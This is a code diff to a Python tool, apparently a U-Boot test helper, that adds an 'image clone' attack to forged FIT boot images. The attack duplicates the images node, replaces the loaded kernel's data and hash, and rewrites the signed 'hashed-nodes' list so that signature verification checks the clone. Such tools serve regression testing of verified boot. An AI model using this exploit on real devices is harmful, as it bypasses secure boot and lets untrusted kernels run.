@@ -14,6 +14,7 @@ FDT_END = 0x9
 
 FAKE_ROOT_ATTACK = 0
 KERNEL_AT = 1
+IMAGE_CLONE = 2
 
 MAGIC = 0xd00dfeed
 
@@ -274,6 +275,66 @@ def get_prop_value(dt_struct, dt_strings, prop_path):
 
     return tag_data
 
+def image_clone_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
+    # retrieve the default configuration name
+    default_conf_name = get_prop_value(
+        dt_struct, dt_strings, '/configurations/default')
+    default_conf_name = str(default_conf_name[:-1], 'utf-8')
+
+    conf_path = '/configurations/' + default_conf_name
+
+    # fetch the loaded kernel name from the default configuration
+    loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')
+
+    loaded_kernel = str(loaded_kernel[:-1], 'utf-8')
+
+    # since this is the last child in images!
+    loaded_fdt_name = get_prop_value(dt_struct, dt_strings, conf_path + '/fdt')
+
+    loaded_fdt_name = str(loaded_fdt_name[:-1], 'utf-8')
+
+     # determine boundaries of the images
+    (img_node_start, img_node_end) = (determine_offset(
+        dt_struct, dt_strings, '/images'))
+    if img_node_start is None and img_node_end is None:
+        print('Fatal error, unable to find images node')
+        sys.exit()
+
+    # copy the images node
+    img_node_copy = dt_struct[img_node_start:img_node_end]
+
+    # create an additional empty node
+    empty_node = struct.pack('>I', FDT_BEGIN_NODE) + b"EMPTYNO\0" + struct.pack('>I', FDT_END_NODE)
+    # right before the end, we add it!
+    img_node_copy = img_node_copy[:-4] + empty_node + img_node_copy[-4:]
+
+    # insert the copy inside the tree
+    dt_struct = dt_struct[:img_node_end-4] + \
+        img_node_copy + empty_node + dt_struct[img_node_end-4:]
+
+    # change the content of the kernel being loaded
+    dt_struct = change_property_value(
+        dt_struct, dt_strings, '/images/' + loaded_kernel + '/data', kernel_content)
+
+    # change the content of the kernel being loaded
+    dt_struct = change_property_value(
+        dt_struct, dt_strings, '/images/' + loaded_kernel + '/hash-1/value', kernel_hash)
+
+    # finally, the main bug: change the hashed nodes to use the images clone instead!
+    hashed_nodes: bytes = get_prop_value(dt_struct, dt_strings, conf_path + '/signature/hashed-nodes')
+    print(f"got hashed nodes: {hashed_nodes}")
+    nodes = hashed_nodes.split(b"\0")
+    patched_nodes = []
+    for node in nodes:
+        new_node = node
+        if node.startswith(b"/images/"):
+            # reparent the node
+            new_node = b"/images" + node
+        patched_nodes.append(new_node)
+    hashed_nodes = b"\0".join(patched_nodes)
+    dt_struct = change_property_value(
+        dt_struct, dt_strings, conf_path + '/signature/hashed-nodes', hashed_nodes)
+    return dt_struct
 
 def kernel_at_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
     """Conduct the kernel@ attack
@@ -419,6 +480,8 @@ def add_evil_node(in_fname, out_fname, kernel_fname, attack):
         attack = FAKE_ROOT_ATTACK
     elif attack == 'kernel@':
         attack = KERNEL_AT
+    elif attack == 'clone':
+        attack = IMAGE_CLONE
     else:
         raise ValueError('Unknown attack name!')
 
@@ -455,6 +518,8 @@ def add_evil_node(in_fname, out_fname, kernel_fname, attack):
     elif attack == KERNEL_AT:
         dt_struct = kernel_at_attack(dt_struct, dt_strings, kernel_content,
                                      hash_digest)
+    elif attack == IMAGE_CLONE:
+        dt_struct = image_clone_attack(dt_struct, dt_strings, kernel_content, hash_digest)
 
     # now rebuild the new file
     size_dt_strings = len(dt_strings)
